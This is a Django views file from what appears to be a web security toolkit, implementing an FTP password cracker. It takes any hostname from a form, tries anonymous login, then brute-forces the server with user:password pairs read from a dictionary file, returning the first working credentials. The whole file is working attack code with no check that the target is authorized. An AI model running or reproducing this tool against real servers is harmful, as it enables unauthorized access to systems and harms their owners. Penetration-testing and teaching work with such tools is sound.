from django.shortcuts import render
import socket
import ftplib
from django.contrib.auth.decorators import login_required

# Create your views here.
@login_required
def index(request):
    host = request.POST.get('hostname')
    if host:
        host = host.strip()
        host = socket.gethostbyname(host)
        user, passwd = anonyLogin(host)
        if user != None and passwd != None:
            anony=True
            return render(request, 'ftp_cracker/index.html', {'host': host, 'user': user, 'passwd': passwd,'anony':anony})
        else:
            user, passwd = login(host)
            if user == None and passwd == None:
                error = ' 尝试爆破失败 '
                return render(request, 'ftp_cracker/index.html', {'host': host, 'error': error})
            return render(request, 'ftp_cracker/index.html', {'host': host, 'user': user, 'passwd': passwd})
    return render(request, 'ftp_cracker/index.html', {'host': host})

def anonyLogin(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous', 'me@your.com')
        ftp.quit()
        user='anonymous'
        password='me@your.com'
        return user,password
    except:
        return None,None


def login(host):
    with open('/var/python_test/test/django/web_security/static/dict/ftp_pwd.txt', 'r') as f:  #部署修改
        for line in f.readlines():
            line=line.strip('\n')
            user,passwd=line.split(":")

            try:
                ftp = ftplib.FTP(host)
                ftp.login(user,passwd)
                ftp.quit()
                return user,passwd
            except:
                continue
        return None,None